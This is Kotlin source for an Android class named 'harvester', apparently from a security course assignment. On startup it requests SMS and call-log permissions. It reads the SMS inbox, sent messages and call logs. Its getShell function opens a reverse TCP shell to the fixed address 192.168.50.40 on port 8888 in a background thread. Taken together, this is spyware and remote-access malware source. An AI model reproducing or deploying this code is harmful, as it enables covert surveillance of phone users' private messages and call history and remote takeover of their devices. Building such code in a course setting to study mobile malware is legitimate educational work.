package com.example.assignment1

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import kotlin.concurrent.thread

class harvester(var activity: Activity, var context: Context) {
//    var smsgetter = smstest(context)
//    var callLogGetter = callLog(context, activity)
    init{
        ActivityCompat.requestPermissions(activity,
        arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CALL_LOG),
        100)
//        checkCallLogPermission()
//        checkSMSPermission()

//        checkStoragePermission()
    }

    fun getSMS(){
//        checkSMSPermission()
        val inbox = smstest(context).readSMSBox("inbox")
        println(inbox)
        val sent = smstest(context).readSMSBox("sent")
        println(sent)
    }

    fun getCallLog(){
//        checkCallLogPermission()
//        val callLogs = callLogGetter.readLogs()
        val callLogs = callLog(context, activity).readLogs()
        println(callLogs)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun getShell(){
        checkNetworkPermission()
        checkStoragePermission()
//        shellGetter.main()
        // This would be a good place to have the threading I think
        println(reverseShell.getShellPath())
        thread(start = true){
//            newShell().main()
            reverseShell.reverse_tcp("192.168.50.40", 8888)
        }

    }

    private fun checkSMSPermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
//            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS)
//            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_SMS), 101)
            return
        }
    }

    private fun checkCallLogPermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_CALL_LOG), 101)
            return
        }
    }

    private fun checkNetworkPermission(){
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.INTERNET)
            != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_NETWORK_STATE)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.INTERNET), 101)
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.ACCESS_NETWORK_STATE), 101)

            return
        }
    }

    private fun checkStoragePermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE ), 101)
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.WRITE_EXTERNAL_STORAGE ), 101)
            return
        }
    }
}